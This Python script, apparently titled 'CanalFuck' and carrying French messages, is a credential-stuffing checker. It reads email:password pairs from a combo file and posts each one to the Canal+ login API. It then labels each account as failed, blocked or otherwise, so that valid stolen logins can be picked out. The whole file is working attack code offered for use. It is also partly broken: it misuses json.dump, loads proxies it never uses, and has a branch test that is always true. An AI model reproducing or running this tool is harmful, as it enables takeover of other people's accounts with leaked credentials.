import requests,os,sys,json

def cls():
    os.system("cls")

def check(email,password):
    data = {"email": email, "password": password, "portailId": "TSRm9mZl5Rs.", "media": "WEBEC", "vect": "INTERNET"}
    r = requests.post("https://pass-api-v2.canal-plus.com/services/apipublique/login", data=data)
    return r.text
    

#Start

banner = """ 
 ██████╗ █████╗ ███╗   ██╗ █████╗ ██╗     ███████╗██╗   ██╗ ██████╗██╗  ██╗
██╔════╝██╔══██╗████╗  ██║██╔══██╗██║     ██╔════╝██║   ██║██╔════╝██║ ██╔╝
██║     ███████║██╔██╗ ██║███████║██║     █████╗  ██║   ██║██║     █████╔╝ 
██║     ██╔══██║██║╚██╗██║██╔══██║██║     ██╔══╝  ██║   ██║██║     ██╔═██╗ 
╚██████╗██║  ██║██║ ╚████║██║  ██║███████╗██║     ╚██████╔╝╚██████╗██║  ██╗
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝  ╚═════╝╚═╝  ╚═╝
           
By Kynda !   \n                                                           
"""
account_number = 0
proxy_number = 0
account_position = 0
proxy_position = 0
cls()
print(banner)
#Check file

try:
    file = open("combo.txt","r")
    combo = file.readlines()
    if len(combo) > 0:
        file.close()
    else:
        file.close()
        sys.exit("[i] Tu dois remplir le fichier combo.txt pour que ça fonctionne.")
except FileNotFoundError:
    print("[!] Aucun fichier combo.txt trouvé !\n Pas d'soucis on va t'en faire un :)")
    file = open("combo.txt","a")
    file.close()
    sys.exit("[i] Tu dois remplir le fichier combo.txt pour que ça fonctionne.")

try:
    file = open("proxy.txt","r")
    proxies = file.readlines()
    if len(proxies) > 0:
        file.close()
    else:
        file.close()
        sys.exit("[i] Tu dois remplir le fichier proxy.txt pour que ça fonctionne.")
except FileNotFoundError:
    print("[!] Aucun fichier proxy.txt trouvé !\n Pas d'soucis on va t'en faire un :)")
    file = open("proxy.txt","a")
    file.close()
    sys.exit("[i] Tu dois remplir le fichier proxy.txt pour que ça fonctionne.")

for account in combo:
    account_number+=1

for proxy in proxies:
    proxy_number+=1

print("Taille de la combo: " + str(account_number))
print("Nombre de proxys: " + str(proxy_number))

while account_position < account_number:
    credentials = combo[account_position]
    credentials = credentials.strip().split(':')
    email = credentials[0]
    password = credentials[1]
    result = check(email,password)
    data = json.dump(result)
    print(data["errorMessage"])
    if "Email manquant ou invalide" in result:
        print("["+str(account_position)+"/"+ str(account_number)+"] FAIL ~> " + email)
    elif "Info : Compte bloque" in result:
        print("["+str(account_position)+"/"+ str(account_number)+"] BLOCKED ~> " + email)
    elif "Login ou mot de passe invalide":
        print("["+str(account_position)+"/"+ str(account_number)+"] FAIL ~> " + email)
    else:
        print(result)
    account_position+=1
